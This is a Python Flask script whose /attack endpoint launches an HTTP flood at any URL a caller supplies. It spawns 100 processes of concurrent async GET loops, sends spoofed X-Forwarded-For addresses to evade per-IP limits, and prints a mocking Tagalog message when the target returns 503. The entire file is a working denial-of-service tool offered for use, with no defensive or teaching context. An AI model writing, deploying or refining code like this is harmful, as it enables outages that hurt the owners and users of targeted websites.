from flask import Flask, request, jsonify
import aiohttp
import asyncio
import time
import multiprocessing
import random

app = Flask(__name__)

total_requests = 100000000
requests_per_second = 1000000
num_ip_addresses = 10

ip_addresses = ['.'.join(str(random.randint(0, 255)) for _ in range(4)) for _ in range(num_ip_addresses)]

async def attack(target_url):
    try:
        requests_sent = 0
        start_time = time.time()
        async with aiohttp.ClientSession() as session:
            while requests_sent < total_requests:
                async with session.get(target_url, headers={'X-Forwarded-For': random.choice(ip_addresses)}) as response:
                    print(f"Status Code: {response.status}")
                    if response.status == 503:
                        print("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣")
                    requests_sent += 1
                    elapsed_time = time.time() - start_time
                    if elapsed_time < 1:
                        await asyncio.sleep(1 - elapsed_time)
                        start_time = time.time()
    except aiohttp.ClientError as e:
        print(e)

async def main(target_url):
    await asyncio.gather(*[attack(target_url) for _ in range(total_requests // requests_per_second)])

@app.route('/attack', methods=['GET'])
def start_attack():
    target_url = request.args.get('url')
    if not target_url:
        return jsonify({'error': 'URL is required'}), 400

    processes = []
    for _ in range(100):
        process = multiprocessing.Process(target=lambda: asyncio.run(main(target_url)))
        process.start()
        processes.append(process)

    for process in processes:
        process.join()

    return jsonify({'message': 'Attack started'}), 200

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=8080)
